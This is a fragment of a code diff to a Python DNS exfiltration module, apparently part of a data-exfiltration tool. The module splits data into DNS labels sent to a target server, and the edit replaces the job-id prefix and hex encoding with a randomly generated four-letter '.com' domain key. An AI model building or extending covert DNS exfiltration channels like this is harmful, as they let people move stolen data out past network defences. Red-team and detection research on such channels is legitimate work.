@@ -3,6 +3,8 @@ from dnslib import DNSRecord
 import socket
 from dpkt import dns
 from random import choice
+import string
+import random
 
 app_exfiltrate = None
 config = None
@@ -68,7 +70,7 @@ def send(data):
         targets = [config['target']]
     port = config['port']
     jobid = data.split("|!|")[0]
-    data = data.encode('hex')
+    # data = data.encode('hex')
     domain = ""
 
     #Calculate the remaining length available for our payload
@@ -79,7 +81,12 @@ def send(data):
     last_label_len = (rem % 64) - 1
 
     while data != "":
-        data = jobid + data
+        config['key'] = ""
+        for i in range(random.randint(4,4)):
+            config['key'] += random.choice(string.ascii_lowercase)
+        config['key'] += ".com"
+        # config['key'] += "-"
+        # data = jobid + data
         for i in range(0, no_labels):
             if data == "": break
             label = data[:63]
